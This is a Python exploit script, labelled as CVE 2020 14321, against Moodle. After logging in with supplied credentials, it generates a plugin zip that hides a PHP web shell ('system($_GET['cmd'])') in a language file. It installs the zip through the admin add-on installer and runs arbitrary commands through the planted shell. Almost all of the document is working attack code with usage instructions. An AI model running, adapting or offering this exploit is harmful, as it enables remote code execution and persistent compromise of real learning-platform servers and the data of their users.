#!/usr/bin/python3

import logging
import random
import string
import os
import time
import zipfile
import sys
import base64
import requests
import re
import argparse
import shutil

headers={"Content-Type":"application/x-www-form-urlencoded"}

class Color:
	BLUE = '\033[94m'
	GREEN = '\033[92m'
	YELLOW = '\033[93m'
	RED = '\033[91m'
	END = '\033[0m'

def random_string(stringLength=5):
	"""Genera una cadena de texto aleatoria de tamaño determinado."""
	letters = string.ascii_letters
	cadena=''.join(random.choice(letters) for i in range(stringLength))
	return cadena.lower()


def crearDirectorios(cadena):
	os.mkdir(cadena)
	os.chdir(cadena)
	fichero="version.php"
	f = open(fichero, "w")
	f.write("<?php\n$plugin->version = 2020061700;\n$plugin->component = 'block_"+ cadena +"';\n?>")
	f.close()
	
	os.mkdir("lang")
	os.chdir("lang")
	os.mkdir("en")
	os.chdir("en")
	fichero2="block_" + cadena + ".php"
	f2 = open(fichero2, "w")
	f2.write("<?php system($_GET['cmd']); ?>")
	f2.close()
	
	return cadena
	
def crearZip(cadena):
	
	os.chdir("../../../")
	zip_filename = cadena + ".zip"
	
	with zipfile.ZipFile(zip_filename, 'w') as zip_file:
			for root, dirs, files in os.walk(cadena):
					for file in files:
							file_path = os.path.join(root, file)
							zip_file.write(file_path)

	shutil.rmtree(cadena)




def conexionMoodle(url,usuario,password):
	#p1 = logging.progress("[+] Iniciando sesión")
	login_url = url + "/login/index.php"
	session = requests.Session()
	r = session.get(login_url)
	login_token = re.findall(r'name="logintoken" value="(.*?)"', r.text)[0]
# Datos de inicio de sesión
	data = {
	"logintoken" : login_token,
    	"username": usuario,
    	"password": password
	}

# Iniciar sesión en Moodle

	response = session.post(login_url, data=data)
	#p1.status("Creds " + Color.BLUE + usuario + ":" + password + Color.END)
	time.sleep(2)
# Verificar si se ha iniciado sesión correctamente
	if "logout" in response.text:
		#p1.success(Color.BLUE + usuario + ":" + password + Color.END + Color.YELLOW + " ✓" + Color.END)
		time.sleep(1)
		print(Color.YELLOW + "[+] Inicio de sesión exitoso" + Color.END)
	else:
		print("Error al iniciar sesión")
	return session


def RCE(url,sess,cadena,command):
# URL para subir un plugin
	
	r = sess.get(url + '/admin/tool/installaddon/index.php')
	if r.status_code == 200:
	
	#itemid =re.findall(r'itemid=(\d*)', r.text)[0]
	#file=open(cadena + ".zip", "rb")
	#file.read()
		new_sess_key=re.findall(r'"sesskey":"(.*?)"', r.text)[0]
	
		itemid = re.findall(r'name="zipfile" id="id_zipfile" value="(.*?)"', r.text)[0]
	else:
		print("Error al obtener la respuesta")
# Datos del plugin
	with open(cadena+".zip", "rb") as file:
		z=file.read()
		zip_file_bytes = base64.b64encode(z)
		zip_b64 = zip_file_bytes.decode("utf-8")
	zip_file= zip_b64.encode('utf-8')
	zip_file_b64 = base64.decodebytes(zip_file)	

	data_get = {"action":"upload"}
	data_file = [('repo_upload_file',(cadena+'.zip', zip_file_b64, 'application/zip'))]
	files = {	
	"sesskey": (None,new_sess_key),
	"repo_id": (None,"5"),
	"itemid": [itemid, itemid],
	"author": (None,"sergio moya"),
	'title': (None, cadena+".zip"),
	"ctx_id" : (None,"1"),
	"accepted_types[]": [".zip",".zip"],
	}
# Subir el plugin
	#p2 = logging.progress("[+] Subiendo zip")
	url_upload =url+"/repository/repository_ajax.php"
	response = sess.post(url_upload, params=data_get, data=files, files=data_file)
	
	if response.status_code == 200:
		#p2.success(Color.BLUE + "[+] Se ha subido el zip correctamente"+ Color.END + Color.YELLOW + " ✓" + Color.END)
		print(Color.YELLOW + "[+] Se ha subido el zip correctamente" + Color.END)
    # install zip file
	new_url=url+"/admin/tool/installaddon/index.php"
	#p2 = logging.progress("[+] Subiendo zip")
	data={
		"sesskey" : (None,new_sess_key),
        	"_qf__tool_installaddon_installfromzip_form" : (None,"1"),
        	"mform_showmore_id_general" : "0",
        	"mform_isexpanded_id_general" : "1",
        	"zipfile" : [itemid, itemid],
        	"plugintype" : "",
        	"rootdir" : "",
        	"submitbutton" : "Install plugin from the ZIP file"
	}
	r=sess.post(new_url, data=data)
	if r.status_code == 200:
		print(Color.YELLOW + "[+] Se ha instalado el plugin correctamente" + Color.END)
	if "Validation successful" not in r.text:
		print("[-] Error when validing this file, try again!")
		sys.exit(1)
    # Confirm load
	zip_storage = re.findall(r'installzipstorage=(.*?)&', r.url)[0]
	data = {
        	"installzipcomponent" : "block_"+cadena,
        	"installzipstorage" : zip_storage,
		"installzipconfirm" : "1",
        	"sesskey" : new_sess_key
	}

	r = sess.post(url + '/admin/tool/installaddon/index.php', data=data)
	if "Current release information" not in r.text:
		print("[-] Error when confirming this file, try again!")
		sys.exit(1)

	print(Color.YELLOW + "[+] Ruta donde se ejecuta RCE: "+url+"/blocks/"+cadena+"/lang/en/block_"+cadena+".php?cmd="+command + Color.END)
	data_get2 = {"cmd" : command}
	response=sess.get(url+"/blocks/"+cadena+"/lang/en/block_"+cadena+".php", params=data_get2)
	print("\n")
	print(Color.GREEN + response.text + Color.END)
	os.remove(cadena + ".zip")

	
if __name__ == '__main__':
	
	print(Color.YELLOW + """          
                     
                ▐  ▓                               ▓      ▓                        ▐  ▓
             ▐ ███ █                               ███    ███                 ▐█████ █▓                          
           █  ████  █                               ███    ███              ██████  ███                          
          █  █  ▓███                                 ██     ██            ▐█▌   █  █ ██                          
         █  ██   ▓█                          ▓       ██     ██            ▓░   █  █  ██            ▌      ░       
        █  ███    ▓               ████      ███▓     ██     ██            ░   █  █   █             █░   ░▓▓     
       ██   ██          ████     █ ███  █  █ ███  █  ██     ██               ██ ██  █       ████    ▌     ███  █ 
       ██   ██         █ ███  █ █   ████  █░  ████   ██     ██               ██ ██ █       █ ███  █ █░     ████  
       ██   ██        █   ████ ██    ██  ██    ██    ██     ██               ██ ███       █   ████  █░      ██   
       ██   ██       ██    ██  ██    ██  ██    ██    ██     ██               ██ ██ ███   ██    ██   █░      ██   
       ██   ██       ██    ██  ██    ██  ██    ██    ██     ██               █▓ ██   ███ ██    ██   █░      ██   
        ██  █▓     ▓ ██    ██  ██    ██  ██    ██    ██     ██               ▓  ██     ████    ██   █░      ██   
         ██ █      █ ██    ██  ██   ▓██  ██    ██    ██     ██                  █     ░████    ██   ██     ▓██   
          ███▓    █  ██▓   ██  ███████    ██░ ██     ██     ██              ███░    ▓███ ██▓   ██    ███▓█████   
           ███████    █████ ██ ██████      ████      ███ █  ███ █          █  ████████    █████ ██     ████ ███  
             ███       ███   ████            ▓        ███    ███          █     ████       ███   ██          ███ 
              ▐                ██                      ▓      ▓           █                           ████▓   ███
                               ██                                          █                        ███▓ ███ ▓██    ▄ ▀ ▄ ▀ 
                                █▓                                          ██                     █▓     ████   
                                ▓                                            ▓                     ▓              
                                ▌
			
	
																			""" + Color.END + Color.GREEN	+"""
						***CVE 2020 14321*** 
    
    
    
    
    		[1] python3 suyScript.py -url http://test.local:8080 -u usuario -p password -cmd id

    """ + Color.END)

	ap = argparse.ArgumentParser()
		# Add the arguments to the parser
	ap.add_argument("-url", "--url", required=True,
										help=" URL for your Moodle target")
	ap.add_argument("-u", "--username",
										help="username")
	ap.add_argument("-p", "--password",
										help="password")
	ap.add_argument("-cmd", "--command", default="whoami",
										help="command")
	args = vars(ap.parse_args())
	url = format(str(args['url']))
	print (Color.YELLOW + '[+] Your target: ' + url + Color.END)
		# username
	uname = format(str(args['username']))
		# password
	upass = format(str(args['password']))
		# command
	command = format(str(args['command']))

	cadena=random_string()
	direct=crearDirectorios(cadena)
	crearZip(direct)
	sess=conexionMoodle(url,uname,upass)
	RCE(url,sess,cadena,command)
	sys.exit(1)
